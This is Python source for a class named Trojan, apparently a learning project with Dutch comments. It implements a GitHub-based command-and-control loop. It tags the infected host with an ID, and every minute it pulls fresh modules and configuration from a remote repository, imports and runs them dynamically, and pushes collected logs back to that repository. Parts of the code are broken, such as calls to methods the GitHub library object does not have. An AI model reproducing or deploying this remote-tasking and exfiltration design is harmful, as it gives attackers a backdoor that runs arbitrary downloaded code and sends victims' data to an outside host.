from github import Github
import socket
import datetime
import random
import os
import json
import time
from importlib import import_module



class Trojan():
    def __init__(self,repo_url):
        self.repo_url = repo_url
        self.github_connectie = Github(self.repo_url)
        self.id = ''
        self.first_time = True

    def run(self):
        """Deze functie zal de applicatie runnen """
        while True:
            if self.first_time == True:
                self.generate_unique_id()
                self.create_directory_in_logs()
                self.run_modules()
                self.first_time = False
                self.github_connectie.send_logs_to_github(self.id)

            else: 
                if self.github_connectie.check_remote_repo():
                    self.github_connectie.load_modules()
                    self.github_connectie.get_config()
                    self.run_modules()
                    self.github_connectie.send_logs_to_github(self.id)
            
            time.sleep(60)

    def run_modules(self):
        """Deze functie zal alle modules inladen van de config en ze ook runnen """
        config_path = "config/config.txt"  # Het pad naar het configuratiebestand
        with open(config_path, "r") as config_file:
            config = json.load(config_file)
            for module_data in config:
                module_name = module_data["module_name"]
                class_name = module_data["class_name"]
                module_path = f"modules.{module_name}"
                module = import_module(module_path)
                my_class = getattr(module, class_name)()
                my_class.log(self.id)


    def generate_unique_id(self):
        """Deze functie zal unique id maken op basis van de hostname + datum + een random nummer"""
        hostname = socket.gethostname()
        current_day = datetime.date.today().strftime('%Y%m%d')
        number = int(random.uniform(1, 2000))
        unique_id = f"{hostname}_{current_day}_{number}"
        self.id = unique_id
    
    def create_directory_in_logs(self):
        """Deze functie zal een map aanmaken in de map logs op basis van de hostname + datum """
        logs_directory = "logs"
        new_directory_path = os.path.join(logs_directory, self.id)
        if not os.path.exists(logs_directory):
            return
        if os.path.exists(new_directory_path):
            return
        os.makedirs(new_directory_path)



def main():
    trojan = Trojan('git@github.com:laurensDSM/test0.git')
    trojan.run()



if __name__ == "__main__":
    main()